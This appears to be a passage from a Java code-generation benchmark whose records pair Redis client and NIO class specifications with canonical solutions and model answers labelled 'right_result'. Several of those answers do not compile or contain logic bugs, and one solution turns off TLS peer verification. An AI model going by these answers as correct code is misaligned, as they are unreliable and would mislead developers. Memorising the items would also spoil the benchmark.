    "Instruction": "Task Description: Create a Java class that provides functionality to connect to Redis Sentinel instances and Redis masters via Sentinel, with support for SSL/TLS connections and custom DNS resolution.\n\nClass Description: The RedisSentinelConnector class facilitates connections to Redis Sentinel servers and Redis master instances through Sentinel, with configurable SSL/TLS options and custom DNS resolution capabilities.\n\nAttributes:\n- clientResources: [ClientResources] - The Lettuce client resources configuration including custom DNS resolver and other client settings\n\nMethods:\n- RedisSentinelConnector([ClientResources clientResources]) -> [RedisSentinelConnector] - Constructor that initializes the connector with custom client resources including DNS resolution configuration\n- connectToSentinelDirectly([String host]) -> [StatefulRedisSentinelConnection<String, String>] - Establishes a direct connection to a Redis Sentinel server with SSL/TLS (peer verification disabled)\n- connectToMasterViaSentinel([String host, String masterId, File truststore]) -> [StatefulRedisConnection<String, String>] - Connects to a Redis master via Sentinel with SSL/TLS using the specified truststore for certificate verification\n- closeConnection([AutoCloseable connection, RedisClient client]) -> [void] - Safely closes the given connection and shuts down the associated Redis client",
    "Canonical_solution": "import io.lettuce.core.*;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.resource.ClientResources;\nimport io.lettuce.core.resource.DnsResolver;\nimport io.lettuce.core.resource.MappingSocketAddressResolver;\nimport io.lettuce.core.sentinel.api.StatefulRedisSentinelConnection;\nimport io.lettuce.test.resource.FastShutdown;\n\npublic class RedisSentinelConnector {\n\n    private final ClientResources clientResources;\n\n    public RedisSentinelConnector(ClientResources clientResources) {\n        this.clientResources = clientResources.mutate()\n                .socketAddressResolver(MappingSocketAddressResolver.create(DnsResolver.jvmDefault(), hostAndPort -> {\n                    return HostAndPort.of(hostAndPort.getHostText(), hostAndPort.getPort() + 443);\n                })).build();\n    }\n\n    public StatefulRedisSentinelConnection<String, String> connectToSentinelDirectly(String host) {\n        RedisURI redisURI = RedisURI.create(\"rediss://\" + host + \":\" + RedisURI.DEFAULT_SENTINEL_PORT);\n        redisURI.setVerifyPeer(false);\n\n        RedisClient client = RedisClient.create(clientResources);\n        StatefulRedisSentinelConnection<String, String> connection = client.connectSentinel(redisURI);\n        return connection;\n    }\n\n    public StatefulRedisConnection<String, String> connectToMasterViaSentinel(String host, String masterId, File truststore) {\n        RedisURI redisURI = RedisURI.create(\"rediss-sentinel://\" + host + \":\" + RedisURI.DEFAULT_SENTINEL_PORT\n                + \"?sentinelMasterId=\" + masterId);\n        SslOptions options = SslOptions.builder().truststore(truststore).build();\n\n        RedisClient client = RedisClient.create(clientResources);\n        client.setOptions(ClientOptions.builder().sslOptions(options).build());\n        StatefulRedisConnection<String, String> connection = client.connect(redisURI);\n        return connection;\n    }\n\n    public void closeConnection(AutoCloseable connection, RedisClient client) {\n        try {\n            if (connection != null) {\n                connection.close();\n            }\n        } finally {\n            if (client != null) {\n                FastShutdown.shutdown(client);\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport io.lettuce.core.RedisClient;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.api.StatefulRedisSentinelConnection;\nimport io.lettuce.core.api.sync.RedisCommands;\nimport io.lettuce.core.resource.ClientResources;\nimport io.lettuce.core.support.SslOptions;\nimport java.io.File;\n\npublic class RedisSentinelConnector {\n    private final ClientResources clientResources;\n\n    public RedisSentinelConnector(ClientResources clientResources) {\n        this.clientResources = clientResources;\n    }\n\n    public StatefulRedisSentinelConnection<String, String> connectToSentinelDirectly(String host) {\n        RedisClient redisClient = RedisClient.create(clientResources, \"redis://\" + host);\n        return redisClient.connectSentinel();\n    }\n\n    public StatefulRedisConnection<String, String> connectToMasterViaSentinel(String host, String masterId, File truststore) {\n        RedisClient redisClient = RedisClient.create(clientResources, \"rediss://sentinel@\" + host + \"/\" + masterId);\n        redisClient.setOptions(SslOptions.builder()\n                .truststore(truststore.getPath())\n                .build());\n        return redisClient.connect();\n    }\n\n    public void closeConnection(AutoCloseable connection, RedisClient client) throws Exception {\n        if (connection != null) {\n            connection.close();\n        }\n        if (client != null) {\n            client.shutdown();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 325,
    "Instruction": "Task Description: Create a Java class that implements a Redis client using connection pooling to perform high-throughput operations in a multi-threaded environment.\n\nClass Description: The RedisPooledClient class provides a thread-safe interface to interact with Redis using a pooled connection. It supports basic CRUD operations and is designed to handle concurrent requests efficiently.\n\nAttributes:\n- jedisPool: JedisPooled - The pooled Redis connection instance that manages connections to the Redis server\n\nMethods:\n- RedisPooledClient(String host, int port, String password) -> void - Constructor that initializes the Redis connection pool with the specified host, port, and password\n- performOperations(int totalOperations) -> void - Executes a specified number of set/get operations across multiple threads to demonstrate concurrent Redis access\n- close() -> void - Properly closes the Redis connection pool to release resources",
    "Canonical_solution": "import redis.clients.jedis.*;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.concurrent.atomic.AtomicInteger;\n\npublic class RedisPooledClient {\n\n    private JedisPooled jedisPool;\n\n    public RedisPooledClient(String host, int port, String password) {\n        this.jedisPool = new JedisPooled(host, port, null, password);\n    }\n\n    public void performOperations(int totalOperations) {\n        List<Thread> threads = new ArrayList<>();\n        AtomicInteger counter = new AtomicInteger();\n\n        for (int i = 0; i < 50; i++) {\n            Thread thread = new Thread(() -> {\n                for (int j = 0; (j = counter.getAndIncrement()) < totalOperations;) {\n                    try {\n                        String key = \"foo\" + j;\n                        jedisPool.set(key, key);\n                        jedisPool.get(key);\n                    } catch (Exception e) {\n                        e.printStackTrace();\n                    }\n                }\n            });\n            threads.add(thread);\n            thread.start();\n        }\n\n        for (Thread t : threads) {\n            try {\n                t.join();\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    public void close() {\n        jedisPool.close();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisPool;\nimport redis.clients.jedis.JedisPoolConfig;\n\npublic class RedisPooledClient {\n    private JedisPool jedisPool;\n\n    public RedisPooledClient(String host, int port, String password) {\n        JedisPoolConfig config = new JedisPoolConfig();\n        this.jedisPool = new JedisPool(config, host, port, 2000, password);\n    }\n\n    public void performOperations(int totalOperations) {\n        for (int i = 0; i < totalOperations; i++) {\n            try (Jedis jedis = jedisPool.getResource()) {\n                jedis.set(\"key\" + i, \"value\" + i);\n                String value = jedis.get(\"key\" + i);\n                System.out.println(\"Operation \" + i + \": key=\" + \"key\" + i + \", value=\" + value);\n            }\n        }\n    }\n\n    public void close() {\n        if (jedisPool != null) {\n            jedisPool.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 326,
    "Instruction": "Task Description: Create a Redis connection manager class in Java that handles connection pooling and basic Redis operations using the Jedis client library.\n\nClass Description: The RedisConnectionManager class provides a convenient way to manage Redis connections using a connection pool and execute common Redis commands. It handles connection lifecycle and resource management.\n\nAttributes:\n- jedisPool: JedisPool - The connection pool instance that manages Redis connections\n\nMethods:\n- RedisConnectionManager(String host, int port, String username, String password) -> void - Constructor that initializes the Redis connection pool with the specified connection parameters\n- executeCommand(RedisCommand command) -> void - Executes the specified Redis command (SET, GET, or INCR) using a connection from the pool and stores the result in the command object for GET operations\n- close() -> void - Closes the connection pool and releases all resources\n- isClosed() -> boolean - Checks if the connection pool is closed",
    "Canonical_solution": "import redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisPool;\nimport redis.clients.jedis.JedisPoolConfig;\nimport redis.clients.jedis.exceptions.JedisException;\n\npublic class RedisConnectionManager {\n\n    private JedisPool jedisPool;\n\n    public RedisConnectionManager(String host, int port, String username, String password) {\n        JedisPoolConfig poolConfig = new JedisPoolConfig();\n        this.jedisPool = new JedisPool(poolConfig, host, port, username, password);\n    }\n\n    public void executeCommand(RedisCommand command) {\n        try (Jedis jedis = jedisPool.getResource()) {\n            switch (command.getOperation()) {\n                case \"SET\":\n                    jedis.set(command.getKey(), command.getValue());\n                    break;\n                case \"GET\":\n                    String result = jedis.get(command.getKey());\n                    command.setResult(result);\n                    break;\n                case \"INCR\":\n                    jedis.incr(command.getKey());\n                    break;\n                default:\n                    throw new JedisException(\"Unsupported operation: \" + command.getOperation());\n            }\n        }\n    }\n\n    public void close() {\n        if (jedisPool != null && !jedisPool.isClosed()) {\n            jedisPool.close();\n        }\n    }\n\n    public boolean isClosed() {\n        return jedisPool == null || jedisPool.isClosed();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisPool;\nimport redis.clients.jedis.JedisPoolConfig;\n\npublic class RedisConnectionManager {\n    private JedisPool jedisPool;\n\n    public enum RedisCommand {\n        SET(\"set\", null),\n        GET(\"get\", \"value\"),\n        INCR(\"incr\", null);\n\n        private final String commandName;\n        private final String defaultValue;\n\n        RedisCommand(String commandName, String defaultValue) {\n            this.commandName = commandName;\n            this.defaultValue = defaultValue;\n        }\n\n        public String getCommandName() {\n            return commandName;\n        }\n\n        public String getDefaultValue() {\n            return defaultValue;\n        }\n    }\n\n    public RedisConnectionManager(String host, int port, String username, String password) {\n        JedisPoolConfig poolConfig = new JedisPoolConfig();\n        jedisPool = new JedisPool(poolConfig, host, port, 2000, password);\n    }\n\n    public void executeCommand(RedisCommand command) {\n        try (Jedis jedis = jedisPool.getResource()) {\n            switch (command) {\n                case SET:\n                    jedis.set(command.getCommandName(), command.getDefaultValue());\n                    break;\n                case GET:\n                    command.setValue(jedis.get(command.getCommandName()));\n                    break;\n                case INCR:\n                    jedis.incr(command.getCommandName());\n                    break;\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void close() {\n        if (jedisPool != null) {\n            jedisPool.close();\n        }\n    }\n\n    public boolean isClosed() {\n        return jedisPool == null || jedisPool.isClosed();\n    }\n}\n```"
  },
  {
    "Task_id": 327,
    "Instruction": "Task Description: Create a Java class that establishes a secure SSL/TLS connection to a Redis server using Lettuce client library, with support for SNI (Server Name Indication) and custom truststore configuration.\n\nClass Description: The RedisSSLConnection class provides a secure way to connect to a Redis server using SSL/TLS encryption. It handles SSL configuration including truststore setup and SNI support, and manages the Redis client lifecycle.\n\nAttributes:\n- redisClient: RedisClient - The underlying Redis client instance\n- connection: StatefulRedisConnection<String, String> - The active Redis connection\n\nMethods:\n- RedisSSLConnection(String redisUri, String hostName, String truststorePath, String truststorePassword) -> void - Constructor that initializes the Redis client with SSL configuration\n  - redisUri: String - Redis server URI (e.g., \"rediss://host:port\")\n  - hostName: String - The hostname for SNI\n  - truststorePath: String - Path to the truststore file\n  - truststorePassword: String - Password for the truststore\n- getConnection() -> StatefulRedisConnection<String, String> - Returns the established Redis connection\n- close() -> void - Closes the connection and shuts down the Redis client",
    "Canonical_solution": "import io.lettuce.core.ClientOptions;\nimport io.lettuce.core.RedisClient;\nimport io.lettuce.core.SslOptions;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport javax.net.ssl.SNIHostName;\nimport javax.net.ssl.SNIServerName;\nimport javax.net.ssl.SSLParameters;\nimport java.io.File;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class RedisSSLConnection {\n\n    private RedisClient redisClient;\n    private StatefulRedisConnection<String, String> connection;\n\n    public RedisSSLConnection(String redisUri, String hostName, String truststorePath, String truststorePassword) {\n        this.redisClient = RedisClient.create(redisUri);\n\n        List<SNIServerName> serverNames = new ArrayList<>();\n        serverNames.add(new SNIHostName(hostName));\n        \n        SslOptions sslOptions = SslOptions.builder()\n                .jdkSslProvider()\n                .truststore(new File(truststorePath), truststorePassword)\n                .sslParameters(() -> {\n                    SSLParameters parameters = new SSLParameters();\n                    parameters.setServerNames(serverNames);\n                    return parameters;\n                }).build();\n\n        ClientOptions clientOptions = ClientOptions.builder()\n                .sslOptions(sslOptions)\n                .build();\n        \n        redisClient.setOptions(clientOptions);\n        this.connection = redisClient.connect();\n    }\n\n    public StatefulRedisConnection<String, String> getConnection() {\n        return this.connection;\n    }\n\n    public void close() {\n        if (connection != null) {\n            connection.close();\n        }\n        if (redisClient != null) {\n            redisClient.shutdown();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport io.lettuce.core.RedisClient;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.support.SslSupport;\nimport javax.net.ssl.SSLParameters;\nimport java.io.FileInputStream;\nimport java.security.KeyStore;\n\npublic class RedisSSLConnection {\n    private RedisClient redisClient;\n    private StatefulRedisConnection<String, String> connection;\n\n    public RedisSSLConnection(String redisUri, String hostName, String truststorePath, String truststorePassword) throws Exception {\n        KeyStore truststore = KeyStore.getInstance(KeyStore.getDefaultType());\n        try (FileInputStream fis = new FileInputStream(truststorePath)) {\n            truststore.load(fis, truststorePassword.toCharArray());\n        }\n\n        SSLParameters sslParams = new SSLParameters();\n        sslParams.setEndpointIdentificationAlgorithm(\"HTTPS\");\n        sslParams.setServerNames(List.of(hostName));\n\n        SslSupport.builder()\n                .sslProvider(SslProvider.OPENSSL)\n                .truststore(truststore)\n                .sslParameters(sslParams)\n                .build();\n\n        redisClient = RedisClient.create(redisUri);\n        connection = redisClient.connect();\n    }\n\n    public StatefulRedisConnection<String, String> getConnection() {\n        return connection;\n    }\n\n    public void close() {\n        if (connection != null) {\n            connection.close();\n        }\n        if (redisClient != null) {\n            redisClient.shutdown();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 328,
    "Instruction": "Task Description: Create a Java class that manages a pool of Redis connections using Jedis, allowing concurrent operations on Redis with connection pooling for efficient resource utilization.\n\nClass Description: RedisConnectionPool is a utility class that manages a pool of Redis connections. It provides thread-safe access to Redis operations and handles connection lifecycle management.\n\nAttributes:\n- pool: JedisPool - The connection pool instance managing Redis connections\n- endpoint: EndpointConfig - Configuration object containing Redis connection details (host, port, password)\n\nMethods:\n- RedisConnectionPool(EndpointConfig endpoint) -> void - Constructor that initializes the Redis connection pool with the given endpoint configuration\n- executeOperations(int totalOperations) -> void - Executes a specified number of Redis SET/GET operations across multiple threads (50 threads by default)\n- close() -> void - Properly shuts down the connection pool and releases all resources",
    "Canonical_solution": "import redis.clients.jedis.*;\nimport org.apache.commons.pool2.impl.GenericObjectPoolConfig;\nimport java.util.concurrent.atomic.AtomicInteger;\n\npublic class RedisConnectionPool {\n\n    private JedisPool pool;\n    private EndpointConfig endpoint;\n\n    public RedisConnectionPool(EndpointConfig endpoint) {\n        this.endpoint = endpoint;\n        this.pool = new JedisPool(new GenericObjectPoolConfig<Jedis>(), \n            endpoint.getHost(), endpoint.getPort(), 2000, endpoint.getPassword());\n    }\n\n    public void executeOperations(int totalOperations) {\n        AtomicInteger ind = new AtomicInteger();\n        for (int i = 0; i < 50; i++) {\n            new Thread(() -> {\n                for (int j = 0; (j = ind.getAndIncrement()) < totalOperations;) {\n                    try (Jedis jedis = pool.getResource()) {\n                        String key = \"foo\" + j;\n                        jedis.set(key, key);\n                        jedis.get(key);\n                    } catch (Exception e) {\n                        e.printStackTrace();\n                    }\n                }\n            }).start();\n        }\n    }\n\n    public void close() {\n        if (pool != null) {\n            pool.destroy();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisPool;\nimport redis.clients.jedis.JedisPoolConfig;\n\npublic class RedisConnectionPool {\n    private JedisPool pool;\n    private EndpointConfig endpoint;\n\n    public RedisConnectionPool(EndpointConfig endpoint) {\n        this.endpoint = endpoint;\n        JedisPoolConfig config = new JedisPoolConfig();\n        config.setMaxTotal(100);\n        config.setMaxIdle(20);\n        config.setMinIdle(5);\n        this.pool = new JedisPool(config, endpoint.getHost(), endpoint.getPort(), 2000, endpoint.getPassword());\n    }\n\n    public void executeOperations(int totalOperations) {\n        int numberOfThreads = 50;\n        Thread[] threads = new Thread[numberOfThreads];\n\n        for (int i = 0; i < numberOfThreads; i++) {\n            threads[i] = new Thread(() -> {\n                try (Jedis jedis = pool.getResource()) {\n                    for (int j = 0; j < totalOperations / numberOfThreads; j++) {\n                        String key = \"key\" + System.currentTimeMillis();\n                        jedis.set(key, \"value\");\n                        String value = jedis.get(key);\n                        if (!\"value\".equals(value)) {\n                            throw new RuntimeException(\"Operation failed\");\n                        }\n                    }\n                } catch (Exception e) {\n                    e.printStackTrace();\n                }\n            });\n            threads[i].start();\n        }\n\n        for (Thread thread : threads) {\n            try {\n                thread.join();\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    public void close() {\n        if (pool != null) {\n            pool.close();\n        }\n    }\n}\n```\n\nThis Java class `RedisConnectionPool` manages a pool of Redis connections using Jedis, providing methods to execute Redis operations concurrently across multiple threads and properly shutting down the connection pool when done."
  },
  {
    "Task_id": 329,
    "Instruction": "Task Description: Create a Java class that provides basic Redis interaction capabilities using the Lettuce client library, including connection management and key-value operations.\n\nClass Description: The RedisInteraction class encapsulates Redis connection and basic operations, providing methods to set/get values and manage the connection lifecycle.\n\nAttributes:\n- redisClient: RedisClient - The main Redis client instance used to create connections\n- connection: StatefulRedisConnection<String, String> - The active Redis connection\n- syncCommands: RedisCommands<String, String> - Synchronous command interface for Redis operations\n\nMethods:\n- RedisInteraction(String redisUri) -> void - Constructor that initializes the Redis client and establishes a connection using the provided URI\n- setValue(String key, String value) -> void - Stores a key-value pair in Redis\n- getValue(String key) -> String - Retrieves the value associated with the given key from Redis\n- closeConnection() -> void - Properly closes the Redis connection and shuts down the client",
    "Canonical_solution": "import io.lettuce.core.RedisClient;\nimport io.lettuce.core.RedisURI;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.api.sync.RedisCommands;\n\npublic class RedisInteraction {\n\n    private RedisClient redisClient;\n    private StatefulRedisConnection<String, String> connection;\n    private RedisCommands<String, String> syncCommands;\n\n    public RedisInteraction(String redisUri) {\n        this.redisClient = RedisClient.create(RedisURI.create(redisUri));\n        this.connection = redisClient.connect();\n        this.syncCommands = connection.sync();\n    }\n\n    public void setValue(String key, String value) {\n        syncCommands.set(key, value);\n    }\n\n    public String getValue(String key) {\n        return syncCommands.get(key);\n    }\n\n    public void closeConnection() {\n        connection.close();\n        redisClient.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport io.lettuce.core.RedisClient;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.api.sync.RedisCommands;\n\npublic class RedisInteraction {\n    private RedisClient redisClient;\n    private StatefulRedisConnection<String, String> connection;\n    private RedisCommands<String, String> syncCommands;\n\n    public RedisInteraction(String redisUri) {\n        redisClient = RedisClient.create(redisUri);\n        connection = redisClient.connect();\n        syncCommands = connection.sync();\n    }\n\n    public void setValue(String key, String value) {\n        syncCommands.set(key, value);\n    }\n\n    public String getValue(String key) {\n        return syncCommands.get(key);\n    }\n\n    public void closeConnection() {\n        if (connection != null) {\n            connection.close();\n        }\n        if (redisClient != null) {\n            redisClient.shutdown();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 33,
    "Instruction": "Task Description: Create a Java class that utilizes Java NIO's FileChannel to map a file into memory for read-only access, providing methods to access the mapped memory address and file size, and properly closing the channel when done.\n\nClass Description: The FileChannelProcessor class provides functionality to open a file using FileChannel, map it into memory in read-only mode, and expose the memory address and file size. It ensures proper resource cleanup by implementing a close method.\n\nAttributes:\nfileChannel: FileChannel - The FileChannel instance used for file operations\nmappedAddress: long - The memory address where the file is mapped\nfileSize: long - The size of the mapped file in bytes\n\nMethods:\nFileChannelProcessor: [Constructor](String filePath) throws IOException - Initializes the FileChannel, maps the file into memory in read-only mode, and stores the memory address and file size\ngetMappedAddress: () -> long - Returns the memory address where the file is mapped\ngetFileSize: () -> long - Returns the size of the mapped file\nclose: () throws IOException - Closes the FileChannel to release system resources",
    "Canonical_solution": "import java.io.IOException;\nimport java.lang.foreign.Arena;\nimport java.nio.channels.FileChannel;\nimport java.nio.channels.FileChannel.MapMode;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\n\npublic class FileChannelProcessor {\n    private FileChannel fileChannel;\n    private long mappedAddress;\n    private long fileSize;\n\n    public FileChannelProcessor(String filePath) throws IOException {\n        this.fileChannel = FileChannel.open(Path.of(filePath), StandardOpenOption.READ);\n        this.fileSize = fileChannel.size();\n        this.mappedAddress = fileChannel.map(MapMode.READ_ONLY, 0, fileSize, Arena.global()).address();\n    }\n\n    public long getMappedAddress() {\n        return mappedAddress;\n    }\n\n    public long getFileSize() {\n        return fileSize;\n    }\n\n    public void close() throws IOException {\n        if (fileChannel != null) {\n            fileChannel.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "right_result": "```java\nimport java.io.IOException;\nimport java.nio.MappedByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\nimport java.nio.file.StandardOpenOption;\n\npublic class FileChannelProcessor {\n    private FileChannel fileChannel;\n    private long mappedAddress;\n    private long fileSize;\n\n    public FileChannelProcessor(String filePath) throws IOException {\n        Path path = Paths.get(filePath);\n        this.fileChannel = FileChannel.open(path, StandardOpenOption.READ);\n        MappedByteBuffer buffer = this.fileChannel.map(FileChannel.MapMode.READ_ONLY, 0, this.fileChannel.size());\n        this.mappedAddress = buffer.address();\n        this.fileSize = this.fileChannel.size();\n    }\n\n    public long getMappedAddress() {\n        return this.mappedAddress;\n    }\n\n    public long getFileSize() {\n        return this.fileSize;\n    }\n\n    public void close() throws IOException {\n        if (this.fileChannel != null && !this.fileChannel.isOpen()) {\n            this.fileChannel.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 331,
    "Instruction": "Task Description: Implement a multi-cluster Redis connection provider that manages connections to multiple Redis clusters with failover capabilities and connection pooling.\n\nClass Description: MultiClusterPooledConnectionProvider is a connection provider that maintains connections to multiple Redis clusters, allowing for cluster failover and providing pooled connections to improve performance. It uses a priority-based system to determine the active cluster and provides thread-safe access to connections.\n\nAttributes:\n- log: Logger - Logger instance for logging events and errors\n- multiClusterMap: Map<Integer, Cluster> - Concurrent map storing Redis clusters with their priority as key\n- activeMultiClusterIndex: Integer - Currently active cluster index (volatile for thread visibility)\n- activeClusterIndexLock: Lock - Reentrant lock for thread-safe modification of active cluster index\n- lastClusterCircuitBreakerForcedOpen: boolean - Flag indicating if circuit breaker was last forced open (volatile for thread visibility)\n\nMethods:\n- MultiClusterPooledConnectionProvider(MultiClusterClientConfig) -> void - Constructor that initializes the connection pools for all configured Redis clusters\n  Input: multiClusterClientConfig - Configuration object containing cluster settings\n  Throws: JedisValidationException if config is null\n\n- getConnection() -> Connection - Gets a connection from the currently active Redis cluster\n  Output: Connection object from the active cluster's pool\n\n- getConnection(int) -> Connection - Gets a connection from a specific Redis cluster by index\n  Input: multiClusterIndex - Priority index of the desired cluster\n  Output: Connection object from the specified cluster's pool\n\n- close() -> void - Closes the connection pool of the currently active cluster\n\nNested Class: Cluster\n- connectionPool: ConnectionPool - Pool of Redis connections for a specific cluster\n- getConnection() -> Connection - Gets a connection from this cluster's pool\n- getConnectionPool() -> ConnectionPool - Returns the connection pool instance",
    "Canonical_solution": "import io.github.resilience4j.circuitbreaker.CircuitBreaker;\nimport io.github.resilience4j.circuitbreaker.CircuitBreaker.State;\nimport io.github.resilience4j.retry.Retry;\nimport org.apache.commons.pool2.impl.GenericObjectPoolConfig;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport redis.clients.jedis.*;\nimport redis.clients.jedis.exceptions.JedisConnectionException;\nimport redis.clients.jedis.exceptions.JedisValidationException;\nimport redis.clients.jedis.util.Pool;\nimport java.util.Map;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.concurrent.locks.Lock;\nimport java.util.concurrent.locks.ReentrantLock;\n\npublic class MultiClusterPooledConnectionProvider implements ConnectionProvider {\n\n    private final Logger log = LoggerFactory.getLogger(getClass());\n    private final Map<Integer, Cluster> multiClusterMap = new ConcurrentHashMap<>();\n    private volatile Integer activeMultiClusterIndex = 1;\n    private final Lock activeClusterIndexLock = new ReentrantLock(true);\n    private volatile boolean lastClusterCircuitBreakerForcedOpen = false;\n\n    public MultiClusterPooledConnectionProvider(MultiClusterClientConfig multiClusterClientConfig) {\n        if (multiClusterClientConfig == null)\n            throw new JedisValidationException(\"MultiClusterClientConfig must not be NULL for MultiClusterPooledConnectionProvider\");\n\n        ClusterConfig[] clusterConfigs = multiClusterClientConfig.getClusterConfigs();\n        for (ClusterConfig config : clusterConfigs) {\n            GenericObjectPoolConfig<Connection> poolConfig = config.getConnectionPoolConfig();\n            String clusterId = \"cluster:\" + config.getPriority() + \":\" + config.getHostAndPort();\n\n            if (poolConfig != null) {\n                multiClusterMap.put(config.getPriority(),\n                        new Cluster(new ConnectionPool(config.getHostAndPort(),\n                                config.getJedisClientConfig(), poolConfig)));\n            } else {\n                multiClusterMap.put(config.getPriority(),\n                        new Cluster(new ConnectionPool(config.getHostAndPort(),\n                                config.getJedisClientConfig())));\n            }\n        }\n    }\n\n    @Override\n    public Connection getConnection() {\n        return multiClusterMap.get(activeMultiClusterIndex).getConnection();\n    }\n\n    public Connection getConnection(int multiClusterIndex) {\n        return multiClusterMap.get(multiClusterIndex).getConnection();\n    }\n\n    @Override\n    public void close() {\n        multiClusterMap.get(activeMultiClusterIndex).getConnectionPool().close();\n    }\n\n    public static class Cluster {\n        private final ConnectionPool connectionPool;\n\n        public Cluster(ConnectionPool connectionPool) {\n            this.connectionPool = connectionPool;\n        }\n\n        public Connection getConnection() {\n            return connectionPool.getResource();\n        }\n\n        public ConnectionPool getConnectionPool() {\n            return connectionPool;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.exceptions.JedisValidationException;\nimport java.util.Map;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.concurrent.locks.Lock;\nimport java.util.concurrent.locks.ReentrantLock;\n\npublic class MultiClusterPooledConnectionProvider {\n    private static final Logger log = LoggerFactory.getLogger(MultiClusterPooledConnectionProvider.class);\n    private final Map<Integer, Cluster> multiClusterMap = new ConcurrentHashMap<>();\n    private volatile int activeMultiClusterIndex;\n    private final Lock activeClusterIndexLock = new ReentrantLock();\n    private volatile boolean lastClusterCircuitBreakerForcedOpen;\n\n    public MultiClusterPooledConnectionProvider(MultiClusterClientConfig multiClusterClientConfig) throws JedisValidationException {\n        if (multiClusterClientConfig == null) {\n            throw new JedisValidationException(\"Configuration cannot be null\");\n        }\n        // Initialize connection pools for all configured clusters\n    }\n\n    public Connection getConnection() {\n        return getConnection(activeMultiClusterIndex);\n    }\n\n    public Connection getConnection(int multiClusterIndex) {\n        Cluster cluster = multiClusterMap.get(multiClusterIndex);\n        if (cluster != null) {\n            return cluster.getConnection();\n        } else {\n            throw new IllegalStateException(\"No cluster found for index \" + multiClusterIndex);\n        }\n    }\n\n    public void close() {\n        Cluster activeCluster = multiClusterMap.get(activeMultiClusterIndex);\n        if (activeCluster != null) {\n            activeCluster.close();\n        }\n    }\n\n    private static class Cluster {\n        private final ConnectionPool connectionPool;\n\n        public Cluster(ConnectionPool connectionPool) {\n            this.connectionPool = connectionPool;\n        }\n\n        public Connection getConnection() {\n            return connectionPool.getResource();\n        }\n\n        public ConnectionPool getConnectionPool() {\n            return connectionPool;\n        }\n\n        public void close() {\n            connectionPool.destroy();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 332,
    "Instruction": "Task Description: Create a Java class that provides a wrapper for JedisSentinelPool to simplify Redis Sentinel connection management in Java applications.\n\nClass Description: JedisSentinelPoolWrapper is a utility class that encapsulates the functionality of JedisSentinelPool, providing methods for pool initialization, resource acquisition, and connection cleanup. It handles Redis Sentinel connections with configurable pool settings and client configurations.\n\nAttributes:\n- masterName: String - The name of the Redis master node in the Sentinel configuration\n- sentinels: Set<HostAndPort> - Set of Sentinel server addresses (host and port)\n- poolConfig: GenericObjectPoolConfig<Jedis> - Configuration for the connection pool\n- masterConfig: JedisClientConfig - Configuration for connections to the master node\n- sentinelConfig: JedisClientConfig - Configuration for connections to Sentinel nodes\n- pool: JedisSentinelPool - The underlying Jedis Sentinel connection pool instance\n\nMethods:\n- initializePool(): void - Initializes the JedisSentinelPool with the configured parameters\n- getResource(): Jedis - Retrieves a Jedis resource from the pool (throws JedisConnectionException if pool not initialized)\n- close(): void - Closes the pool if it's open\n- isClosed(): boolean - Returns whether the pool is closed\n- destroy(): void - Destroys the pool and all its resources\n- toStrings(Set<HostAndPort>): Set<String> - Static helper method to convert HostAndPort objects to strings",
